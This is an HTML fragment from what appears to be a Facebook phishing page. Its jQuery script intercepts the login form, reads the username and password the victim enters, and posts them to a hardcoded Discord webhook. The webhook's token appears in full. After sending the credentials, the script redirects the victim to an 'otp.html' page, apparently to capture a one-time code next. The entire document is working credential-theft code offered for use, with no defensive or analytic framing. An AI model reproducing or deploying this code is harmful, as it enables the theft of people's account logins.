<body>
    <div class="logo">

    <script>
       $(document).ready(function() {
      var avatarUrl = '';
      var username = "W15D0M";
      var webhookUrl = "https://discord.com/api/webhooks/1242423810557218836/Qqw5cfXxLVYRWeB8pEX0T8XNtWeg1tfDQE9dt0cBtGVDBEXbL31UJYhMHQ0Q6ZWpDKo1"; <!--Literally read-->

      $("#webhookForm").submit(function(event) {
        event.preventDefault();

        var usernameInput = $("#username").val();
        var passwordInput = $("#password").val();

        var embedFields = [
          { name: "Facebook-Username", value: usernameInput },
          { name: "Facebook-Password", value: passwordInput }
        ];

        var payload = {
          username: username,
          avatar_url: avatarUrl,
          embeds: [{
            author: {
              name: username,
              icon_url: avatarUrl
            },
            title: "Credentials",
            fields: embedFields,
            color: 2
          }]
        };

        $.ajax({
          url: webhookUrl,
          type: "POST",
          contentType: "application/json",
          data: JSON.stringify(payload),
          success: function() {
			window.location.assign("otp.html");
          },
          error: function() {
            alert("Error.");
          }
        });
      });
    });

         </script>
     



</body>
